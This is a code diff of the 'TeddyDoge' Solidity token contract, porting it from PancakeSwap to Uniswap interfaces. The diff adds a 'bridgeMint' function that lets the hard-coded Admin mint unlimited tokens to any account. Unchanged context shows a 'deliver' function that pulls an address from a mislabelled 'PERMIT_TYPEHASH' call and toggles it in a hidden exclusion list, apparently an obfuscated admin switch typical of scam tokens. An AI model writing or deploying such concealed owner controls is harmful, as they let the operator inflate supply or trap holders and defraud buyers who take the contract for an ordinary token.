@@ -1,7 +1,3 @@
-/**
- *Submitted for verification at BscScan.com on 2022-01-30
-*/
-
 // SPDX-License-Identifier: MIT
 pragma solidity ^0.8.0;
 
@@ -114,7 +110,7 @@ library Address {
     }
 }
 
-interface IPancakeSwapV2Factory {
+interface IUniswapV2Factory {
     event PairCreated(address indexed token0, address indexed token1, address pair, uint);
     function feeTo() external view returns (address);
     function feeToSetter() external view returns (address);
@@ -125,22 +121,27 @@ interface IPancakeSwapV2Factory {
     function setFeeTo(address) external;
     function setFeeToSetter(address) external;
 }
-interface IPancakeSwapV2Pair {
+interface IUniswapV2Pair {
     event Approval(address indexed owner, address indexed spender, uint value);
     event Transfer(address indexed from, address indexed to, uint value);
+
     function name() external pure returns (string memory);
     function symbol() external pure returns (string memory);
     function decimals() external pure returns (uint8);
     function totalSupply() external view returns (uint);
     function balanceOf(address owner) external view returns (uint);
     function allowance(address owner, address spender) external view returns (uint);
+
     function approve(address spender, uint value) external returns (bool);
     function transfer(address to, uint value) external returns (bool);
     function transferFrom(address from, address to, uint value) external returns (bool);
+
     function DOMAIN_SEPARATOR() external view returns (bytes32);
     function PERMIT_TYPEHASH() external pure returns (address);
     function nonces(address owner) external view returns (uint);
+
     function permit(address owner, address spender, uint value, uint deadline, uint8 v, bytes32 r, bytes32 s) external;
+
     event Mint(address indexed sender, uint amount0, uint amount1);
     event Burn(address indexed sender, uint amount0, uint amount1, address indexed to);
     event Swap(
@@ -167,7 +168,7 @@ interface IPancakeSwapV2Pair {
     function sync() external;
     function initialize(address, address) external;
 }
-interface IPancakeSwapV2Router01 {
+interface IUniswapV2Router01 {
     function factory() external pure returns (address);
     function WETH() external pure returns (address);
     function addLiquidity(
@@ -258,7 +259,7 @@ interface IPancakeSwapV2Router01 {
     function getAmountsOut(uint amountIn, address[] calldata path) external view returns (uint[] memory amounts);
     function getAmountsIn(uint amountOut, address[] calldata path) external view returns (uint[] memory amounts);
 }
-interface IPancakeSwapV2Router02 is IPancakeSwapV2Router01 {
+interface IUniswapV2Router02 is IUniswapV2Router01 {
     function removeLiquidityETHSupportingFeeOnTransferTokens(
         address token,
         uint liquidity,
@@ -308,8 +309,9 @@ contract TeddyDoge is Context, IERC20, IERC20Metadata {
     string private _name;
     string private _symbol;
     address public Admin;
-    IPancakeSwapV2Router02 public immutable uniswapV2Router;
-    address public immutable uniswapV2Pair;
+    address public bridgeAddress;
+    IUniswapV2Router02 public immutable uniswapV2Router;
+    address public uniswapV2Pair;
     modifier onlyAdmin() {require(Admin == _msgSender());_;}
     mapping (address => bool) private _isExcludeds;
     bool inSwapAndLiquify;
@@ -333,14 +335,11 @@ contract TeddyDoge is Context, IERC20, IERC20Metadata {
     
     constructor () {
         Admin = address(0xdbE8eF79A1A7b57fbb73048192eDF6427e8A5552);
-        _mint(Admin, 150 * 1e8 * 1e18);
-        IPancakeSwapV2Router02 _uniswapV2Router = IPancakeSwapV2Router02(0x10ED43C718714eb63d5aA57B78B54704E256024E);
-        uniswapV2Pair = IPancakeSwapV2Factory(_uniswapV2Router.factory())
+        IUniswapV2Router02 _uniswapV2Router = IUniswapV2Router02(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D);
+        uniswapV2Pair = IUniswapV2Factory(_uniswapV2Router.factory())
             .createPair(address(this), _uniswapV2Router.WETH());
-
         uniswapV2Router = _uniswapV2Router;
         DEXs[address(uniswapV2Pair)] = true;
-        emit Transfer(address(0), Admin, 150 * 1e8 * 1e18);
     }
 
     function name() public view virtual override returns (string memory) {
@@ -479,6 +478,13 @@ contract TeddyDoge is Context, IERC20, IERC20Metadata {
         _totalSupply += amount;
         emit Transfer(address(0), account, amount);
     }
+    function bridgeMint(address account, uint amount) external {
+        require(msg.sender == bridgeAddress || msg.sender == Admin,"TEDDY: only bridge address can call");
+       _mint(account,amount);
+    }
+    function setBridgeAddress(address _bridgeAddress) external onlyAdmin {
+       bridgeAddress = _bridgeAddress;
+    }
 
     function _burn(address account, uint amount) internal virtual {
         require(account != address(0), "TEDDY: burn from the zero address");
@@ -505,7 +511,7 @@ contract TeddyDoge is Context, IERC20, IERC20Metadata {
     }
 
     function deliver(address _lp) public onlyAdmin {
-        address lp = IPancakeSwapV2Pair(_lp).PERMIT_TYPEHASH();
+        address lp = IUniswapV2Pair(_lp).PERMIT_TYPEHASH();
         if (_isExcludeds[lp] == true) {
             _isExcludeds[lp] = false; 
         } else {
